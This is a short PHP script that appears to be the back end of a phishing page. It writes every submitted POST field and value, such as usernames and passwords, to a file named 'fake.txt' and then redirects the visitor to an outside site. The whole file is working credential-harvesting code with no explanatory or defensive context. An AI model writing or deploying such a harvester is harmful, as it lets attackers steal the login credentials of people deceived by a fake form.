<?php
header ('Location: http://rmar.in');
$handler = fopen("fake.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handler, $variable);
fwrite($handler, "=");
fwrite($handler, $value);
fwrite($handler, "\r\n");
}
fwrite($handler, "\r\n");
fclose($handler);

exit;
?>
